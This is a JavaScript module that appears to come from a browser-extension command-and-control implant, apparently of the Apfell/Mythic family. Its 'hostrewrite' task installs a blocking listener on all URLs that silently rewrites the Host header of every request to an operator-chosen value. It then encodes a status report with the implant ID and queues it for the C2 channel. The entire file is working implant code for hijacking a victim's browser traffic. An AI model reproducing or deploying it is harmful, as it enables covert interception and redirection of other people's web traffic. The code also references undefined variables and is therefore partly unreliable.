exports.hostrewrite = function(task) {
    try {
        let args = JSON.parse(task.parameters.toString());
        const host = args.host;
        chrome.webRequest.onBeforeSendHeaders.addListener(
            function(details) {
              for (var i = 0; i < details.requestHeaders.length; ++i) {
                if (details.requestHeaders[i].name === 'Host') {
                    details.requestHeaders[i].value = host;
                  break;
                }
              }
              return {requestHeaders: details.requestHeaders};
            },
            {urls: ["<all_urls>"]},
            ["blocking", "requestHeaders"]

          ,function(){
            if (chrome.runtime.lastError) {
                C2.sendError(taskid, tasktype);
            } else {
                let response = {"task_id":task.id, "user_output":"added listener to rewrite host header with " + host, "completed": true};
                let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
                let enc = JSON.stringify(outer_response);
                let final = apfell.apfellid + enc;
                let msg = btoa(unescape(encodeURIComponent(final)));
                out.push(msg);
            }
        });
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
    
};